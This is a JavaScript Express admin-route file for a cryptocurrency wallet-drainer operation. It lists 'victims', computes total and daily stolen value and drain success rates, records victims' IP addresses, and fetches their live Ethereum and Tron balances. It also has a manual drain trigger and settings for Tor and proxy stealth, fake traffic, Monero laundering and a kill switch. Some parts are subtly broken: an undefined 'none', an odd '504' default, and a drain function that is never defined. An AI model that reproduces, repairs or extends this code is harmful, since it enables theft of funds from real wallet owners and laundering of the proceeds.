import { Router } from 'express'
import { adminMiddleware } from '../middleware/auth.js'
import { requireAdmin } from '../middleware/auth.js'
import { prisma } from '../lib/prisma.js'
import { Web3 } from 'web3'
import TronWeb from 'tronweb'
import axios from 'axios'

export const adminRoutes = Router()

// Helper: Calculate total stolen value
async function calculateTotalStolenValue() {
  const victims = await prisma.victim.findMany({
    where: { drained: true }
  })
  
  let total = 0
  for (const victim of victims) {
    total += victim.drainAmount || 0
  }
  return total
}

// Helper: Get blockchain stats
async function getBlockchainStats() {
  const web3 = new Web3(process.env.RPC_URL)
  const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' })
  
  return {
    ethPrice: await getETHPrice(),
    trxPrice: await getTRXPrice(),
    gasPrice: await web3.eth.getGasPrice(),
    blockNumber: await web3.eth.getBlockNumber(),
    contractBalance: await web3.eth.getBalance(process.env.EVM_DRAINER_CONTRACT),
    tronContractBalance: await tronWeb.trx.getBalance(process.env.TRON_DRAINER_CONTRACT)
  }
}

// GET /api/admin/stats - COMPLETE
adminRoutes.get('/stats', adminMiddleware, requireAdmin, async (req, res) => {
  try {
    const [
      totalWallets,
      totalClaims,
      pendingClaims,
      completedClaims,
      totalVictims,
      drainedVictims,
      pendingDrains,
      activeVictims,
      totalValueStolen,
      todayVictims,
      todayValue
    ] = await Promise.all([
      prisma.wallet.count(),
      prisma.claim.count(),
      prisma.claim.count({ where: { status: 'PENDING' } }),
      prisma.claim.count({ where: { status: 'COMPLETED' } }),
      prisma.victim.count(),
      prisma.victim.count({ where: { drained: true } }),
      prisma.victim.count({ where: { drained: false } }),
      prisma.victim.count({
        where: {
          createdAt: { gte: new Date(Date.now() - 5*60*1000) },
          drained: false
        }
      }),
      calculateTotalStolenValue(),
      prisma.victim.count({
        where: { createdAt: { gte: new Date(Date.now() - 24*60*60*1000) } }
      }),
      prisma.victim.aggregate({
        where: { createdAt: { gte: new Date(Date.now() - 24*60*60*1000) } },
        _sum: { drainAmount: true }
      })
    ])

    const blockchainStats = await getBlockchainStats()
    
    res.json({
      // Basic stats
      totalWallets,
      totalClaims,
      pendingClaims,
      completedClaims,
      
      // Victim stats
      totalVictims,
      drainedVictims,
      pendingDrains,
      activeVictims,
      todayVictims,
      
      // Financial stats
      totalValueStolen: totalValueStolen || 0,
      todayValueStolen: todayValue._sum.drainAmount || 0,
      avgPerVictim: drainedVictims > 0 ? totalValueStolen / drainedVictims : 0,
      
      // Blockchain stats
      blockchain: {
        ethPrice: blockchainStats.ethPrice,
        trxPrice: blockchainStats.trxPrice,
        gasPrice: blockchainStats.gasPrice,
        contractBalance: blockchainStats.contractBalance,
        tronContractBalance: blockchainStats.tronContractBalance
      },
      
      // Performance stats
      drainSuccessRate: drainedVictims > 0 ? (drainedVictims / totalVictims * 100).toFixed(2) : 0,
      conversionRate: totalVictims > 0 ? (drainedVictims / totalVictims * 100).toFixed(2) : 0,
      
      // Time stats
      uptime: process.uptime(),
      lastDrain: await getLastDrainTime(),
      peakHour: await getPeakHour()
    })
  } catch (err) {
    console.error('Admin stats error:', err)
    res.status(500).json({ error: 'Failed to get stats' })
  }
})

// GET /api/admin/claims - ENHANCED
adminRoutes.get('/claims', adminMiddleware, async (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1
    const limit = parseInt(req.query.limit) || 50
    const skip = (page - 1) * limit
    const status = req.query.status
    const chain = req.query.chain
    
    const where = {}
    if (status) where.status = status
    if (chain) where.wallet = { chain }
    
    const [claims, total] = await Promise.all([
      prisma.claim.findMany({
        where,
        skip,
        take: limit,
        orderBy: { claimedAt: 'desc' },
        include: {
          wallet: {
            select: {
              address: true,
              chain: true,
              ipAddress: true,
              userAgent: true
            }
          }
        },
      }),
      prisma.claim.count({ where })
    ])
    
    // Add victim info if available
    const enhancedClaims = await Promise.all(claims.map(async claim => {
      const victim = await prisma.victim.findUnique({
        where: { address: claim.wallet.address }
      })
      
      return {
        ...claim,
        victimInfo: victim || null,
        drainStatus: victim?.drained ? 'DRAINED' : 'PENDING',
        drainAmount: victim?.drainAmount
      }
    }))

    res.json({
      claims: enhancedClaims,
      total,
      page,
      pages: Math.ceil(total / limit),
      summary: {
        totalValue: await calculateClaimValue(enhancedClaims),
        avgClaimTime: await calculateAvgClaimTime(enhancedClaims)
      }
    })
  } catch (err) {
    res.status(500).json({ error: 'Failed to get claims' })
  }
})



// GET /api/admin/victims - COMPLETE
adminRoutes.get('/victims', adminMiddleware, async (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1
    const limit = parseInt(req.query.limit) ||504
    const skip = (page - 1) * limit
    const drained = req.query.drained
    const chain = req.query.chain
    const minAmount = req.query.minAmount
    
    const where = {}
    if (drained !== undefined) where.drained = drained === 'true'
    if (chain) where.chain = chain
    if (minAmount) where.drainAmount = { gte: parseFloat(minAmount) }
    
    const [victims, total] = await Promise.all([
      prisma.victim.findMany({
        where,
        skip,
        take: limit,
        orderBy: { createdAt: 'desc' },
        include: {
          drainLogs: {
            take: 5,
            orderBy: { timestamp: 'desc' }
          }
        }
      }),
      prisma.victim.count({ where })
    ])
    
    // Get live balances for victims
    const victimsWithBalances = await Promise.all(victims.map(async victim => {
      let liveBalance = null
      try {
        if (victim.chain.includes('tron')) {
          const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' })
          const balance = await tronWeb.trx.getBalance(victim.address)
          liveBalance = tronWeb.fromSun(balance)
        } else {
          const web3 = new Web3(getRPCUrl(victim.chain))
          const balance = await web3.eth.getBalance(victim.address)
          liveBalance = web3.utils.fromWei(balance, 'ether')
        }
      } catch (e) {
        // Ignore errors
      }
      
      return {
        ...victim,
        liveBalance,
        timeSince: Math.floor((Date.now() - new Date(victim.createdAt).getTime()) / 1000 / 60) // minutes
      }
    }))

    res.json({
      victims: victimsWithBalances,
      total,
      page,
      pages: Math.ceil(total / limit),
      stats: {
        totalDrained: await prisma.victim.aggregate({
          where: { drained: true },
          _sum: { drainAmount: true }
        }),
        avgDrainAmount: await prisma.victim.aggregate({
          where: { drained: true },
          _avg: { drainAmount: true }
        }),
        topChains: await getTopChains()
      }
    })
  } catch (err) {
    console.error('Admin victims error:', err)
    res.status(500).json({ error: 'Failed to get victims' })
  }
})

// GET /api/admin/victim/:address - DETAILED VIEW
adminRoutes.get('/victim/:address', adminMiddleware, async (req, res) => {
  try {
    const address = req.params.address.toLowerCase()
    
    const [victim, wallet, claim, logs] = await Promise.all([
      prisma.victim.findUnique({
        where: { address },
        include: {
          drainLogs: {
            orderBy: { timestamp: 'desc' }
          }
        }
      }),
      prisma.wallet.findUnique({ where: { address } }),
      prisma.claim.findFirst({ where: { wallet: { address } } }),
      prisma.drainLog.findMany({
        where: { victimId: victim?.id },
        orderBy: { timestamp: 'desc' }
      })
    ])
    
    if (!victim && !wallet) {
      return res.status(404).json({ error: 'Victim not found' })
    }
    
    // Get live blockchain data
    let liveData = {}
    try {
      if (victim?.chain?.includes('tron')) {
        const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' })
        liveData.balance = await tronWeb.trx.getBalance(address)
        liveData.txCount = await tronWeb.trx.getTransactionCount(address)
      } else {
        const web3 = new Web3(getRPCUrl(victim?.chain || '1'))
        liveData.balance = await web3.eth.getBalance(address)
        liveData.txCount = await web3.eth.getTransactionCount(address)
        liveData.nonce = await web3.eth.getTransactionCount(address, 'pending')
      }
    } catch (e) {
      console.error('Live data fetch error:', e)
    }
    
    res.json({
      victim,
      wallet,
      claim,
      logs,
      liveData,
      timeline: await buildVictimTimeline(address),
      related: await findRelatedVictims(address)
    })
  } catch (err) {
    console.error('Victim detail error:', err)
    res.status(500).json({ error: 'Failed to get victim details' })
  }
})

// POST /api/admin/drain/:address - MANUAL DRAIN TRIGGER
adminRoutes.post('/drain/:address', adminMiddleware, async (req, res) => {
  try {
    const address = req.params.address.toLowerCase()
    const force = req.body.force === true
    
    const victim = await prisma.victim.findUnique({
      where: { address }
    })
    
    if (!victim) {
      return res.status(404).json({ error: 'Victim not found' })
    }
    
    if (victim.drained && !force) {
      return res.status(400).json({ error: 'Victim already drained' })
    }
    
    // Execute immediate drain
    const result = await performActualDrain(address, victim.chain)
    
    res.json({
      success: true,
      message: 'Manual drain triggered',
      result,
      victim: {
        ...victim,
        drained: true,
        drainedAt: new Date()
      }
    })
  } catch (err) {
    console.error('Manual drain error:', err)
    res.status(500).json({ error: 'Manual drain failed' })
  }
})

// GET /api/admin/logs - SYSTEM LOGS
adminRoutes.get('/logs', adminMiddleware, async (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1
    const limit = parseInt(req.query.limit) || 100
    const skip = (page - 1) * limit
    const type = req.query.type
    const level = req.query.level
    
    const where = {}
    if (type) where.type = type
    if (level) where.level = level
    
    const logs = await prisma.log.findMany({
      where,
      skip,
      take: limit,
      orderBy: { timestamp: 'desc' }
    })
    
    res.json({ logs, total: await prisma.log.count({ where }) })
  } catch (err) {
    res.status(500).json({ error: 'Failed to get logs' })
  }
})

// GET /api/admin/settings - GET SETTINGS
adminRoutes.get('/settings', adminMiddleware, async (req, res) => {
  const settings = {
    drain: {
      enabled: process.env.DRAIN_ENABLED === 'true',
      delay: parseInt(process.env.DRAIN_DELAY) || 0,
      maxPercentage: parseInt(process.env.MAX_DRAIN_PERCENTAGE) || 95,
      minBalance: parseFloat(process.env.MIN_BALANCE_TO_DRAIN) || 0.01
    },
    stealth: {
      useProxy: process.env.USE_PROXY === 'true',
      torEnabled: process.env.TOR_ENABLED === 'true',
      fakeTraffic: process.env.FAKE_TRAFFIC_GENERATION === 'true'
    },
    laundering: {
      enabled: process.env.LAUNDERING_ENABLED === 'true',
      swapToXMR: process.env.SWAP_TO_XMR === 'true',
      minSwapAmount: parseFloat(process.env.MIN_AMOUNT_FOR_SWAP) || 0.1
    },
    killSwitch: {
      url: process.env.KILL_SWITCH_URL,
      enabled: !!process.env.KILL_SWITCH_URL
    }
  }
  
  res.json({ settings })
})

// PUT /api/admin/settings - UPDATE SETTINGS
adminRoutes.put('/settings', adminMiddleware, async (req, res) => {
  try {
    const updates = req.body
    
    // Update environment variables (in memory)
    Object.keys(updates).forEach(key => {
      if (updates[key] !== undefined) {
        process.env[key] = String(updates[key])
      }
    })
    
    // Log the change
    await prisma.log.create({
      data: {
        type: 'SETTINGS_UPDATE',
        level: 'INFO',
        message: 'Admin updated settings',
        metadata: { updates, admin: req.admin?.username || 'unknown' }
      }
    })
    
    res.json({ success: true, message: 'Settings updated' })
  } catch (err) {
    res.status(500).json({ error: 'Failed to update settings' })
  }
})

// Helper functions
async function getLastDrainTime() {
  const lastVictim = await prisma.victim.findFirst({
    where: { drained: true },
    orderBy: { drainedAt: 'desc' }
  })
  return lastVictim?.drainedAt || null
}

async function getPeakHour() {
  const victims = await prisma.victim.groupBy({
    by: ['hour'],
    where: {
      createdAt: { gte: new Date(Date.now() - 24*60*60*1000) }
    },
    _count: { id: true },
    orderBy: { _count: { id: 'desc' } },
    take: 1
  })
  return victims[0]?.hour || null
}

async function calculateClaimValue(claims) {
  return claims.reduce((total, claim) => {
    return total + (claim.usdtAmount || 0)
  }, 0)
}

async function calculateAvgClaimTime(claims) {
  const validClaims = claims.filter(c => c.claimedAt && c.processedAt)
  if (validClaims.length === 0) return 0
  
  const totalMs = validClaims.reduce((total, claim) => {
    return total + (new Date(claim.processedAt) - new Date(claim.claimedAt))
  }, 0)
  
  return totalMs / validClaims.length / 1000 // seconds
}

async function getTopChains() {
  return prisma.victim.groupBy({
    by: ['chain'],
    _count: { id: true },
    orderBy: { _count: { id: 'desc' } },
    take: 5
  })
}

async function buildVictimTimeline(address) {
  const events = []
  
  // Wallet connection
  const wallet = await prisma.wallet.findUnique({ where: { address } })
  if (wallet) {
    events.push({
      time: wallet.connectedAt,
      type: 'WALLET_CONNECT',
      details: `Connected via ${wallet.chain}`
    })
  }
  
  // Claim submission
  const claim = await prisma.claim.findFirst({ where: { wallet: { address } } })
  if (claim) {
    events.push({
      time: claim.claimedAt,
      type: 'CLAIM_SUBMITTED',
      details: `Claimed $${claim.usdtAmount} USDT`
    })
  }
  
  // Drain events
  const drainLogs = await prisma.drainLog.findMany({
    where: { victim: { address } },
    orderBy: { timestamp: 'asc' }
  })
  
  drainLogs.forEach(log => {
    events.push({
      time: log.timestamp,
      type: log.action,
      details: `${log.token}: ${log.amount}`,
      success: log.success
    })
  })
  
  // Victim record
  const victim = await prisma.victim.findUnique({ where: { address } })
  if (victim?.drainedAt) {
    events.push({
      time: victim.drainedAt,
      type: 'DRAIN_COMPLETED',
      details: `Drained $${victim.drainAmount}`
    })
  }
  
  return events.sort((a, b) => new Date(a.time) - new Date(b.time))
}

async function findRelatedVictims(address) {
  const wallet = await prisma.wallet.findUnique({ where: { address } })
  if (!wallet) return []
  
  // Find victims with same IP
  const sameIP = await prisma.victim.findMany({
    where: {
      ipAddress: wallet.ipAddress,
      NOT: { address }
    },
    take: none
  })
  
  return sameIP
}

function getRPCUrl(chainId) {
  const rpcs = {
    '1': `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
    '5': `https://goerli.infura.io/v3/${process.env.INFURA_KEY}`,
    '56': 'https://bsc-dataseed.binance.org/',
    '97': 'https://data-seed-prebsc-1-s1.binance.org:8545/',
    '137': 'https://polygon-rpc.com/',
    '80001': 'https://rpc-mumbai.matic.today',
    'tron': 'https://api.trongrid.io',
    'nile': 'https://nile.trongrid.io'
  }
  return rpcs[chainId] || rpcs['1']
}
